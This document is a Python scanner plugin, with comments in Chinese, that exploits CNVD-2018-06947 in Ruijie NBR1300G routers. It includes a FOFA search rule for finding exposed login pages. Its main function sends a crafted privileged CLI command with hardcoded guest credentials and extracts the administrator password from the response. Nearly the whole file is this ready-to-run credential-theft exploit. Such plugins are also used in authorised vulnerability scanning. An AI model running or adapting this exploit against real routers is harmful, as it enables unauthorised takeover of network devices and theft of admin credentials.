# -*- coding: UTF-8 -*-
# !/usr/bin/python
import requests
import re
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import urllib3
urllib3.disable_warnings()

def vuln_info():
    info = {
        'vuln_name': '锐捷NBR1300G路由器越权CLI命令执行漏洞',  # 漏洞名称
        'vuln_referer': 'http://wiki.peiqi.tech/',  # 漏洞来源
        'vuln_author': 'Bob',  # 插件作者
        'cms_name': '锐捷',  # cms_name需要和上级目录保持一致。扫描器自动添加会调用。GUI版本不会调用
        'vuln_description': '''锐捷NBR 1300G路由器 越权CLI命令执行漏洞，guest账户可以越权获取管理员账号密码''',
        'vuln_identifier': '''CNVD-2018-06947''',
        'vuln_class': '远程命令执行',
        'vuln_solution': '''禁用guest账户，合理分配权限''',
        'FofaQuery_type': 'socket',  # socket、http
        'FofaQuery_link': 'all',  # 此处的路径会加在url拼接访问，进行FofaQuery的条件匹配 此处为all为全部页面都检测
        'FofaQuery_rule': 'title="锐捷网络 --NBR路由器--登录界面"',
        # header="JSESSIONID" || body="Struts Problem Report" || body="There is no Action mapped for namespace" || body="No result defined for action and result input" || header="Servlet" || header="JBoss",port="60001"
        # header', 'body', 'title', 'banner','port','banner','service','protocol','server'
        'ispoc': 1,  # 是否有poc  1为有 0为无
        'isexp': 0  # 是否有exp   1为有 0为无
    }
    return info


# url：url  hostname：主机地址  port：端口  scheme：服务  heads：http自定义头信息
def do_poc(url,hostname,port,scheme,heads={},func_out=print,plugins_temp_data={}):
    result = {"Result":False,"Result_Info":""}

    vuln_url = url + "/WEB_VMS/LEVEL15/"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded",
        "Authorization": "Basic Z3Vlc3Q6Z3Vlc3Q="
    }
    data = 'command=show webmaster user&strurl=exec%04&mode=%02PRIV_EXEC&signname=Red-Giant.'
    try:
        response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=10)
        # print("\033[36m[o] 正在执行 show webmaster user \033[0m".format(url))
        if "webmaster" in response.text and " password" in response.text and response.status_code == 200:
            user_data = re.findall(r'webmaster level 0 username admin password (.*?)<OPTION>', response.text)[0]
            # print("\033[36m[o] 成功获取, 管理员用户账号密码为: admin/{} \033[0m".format(user_data))
            result['Result'] = True
            result['Result_Info'] = "admin/"+user_data
        else:
            # print("\033[31m[x] 请求失败:{} \033[0m")
            result['Result_Info'] = "请求失败"
    except Exception as e:
        func_out('Error',str(e) + str(e.__traceback__.tb_lineno) + '行')
    return result


if __name__ == '__main__':
    # url = 'xxx'
    aa = do_poc(url, '', '', '', heads={})
    print(aa)
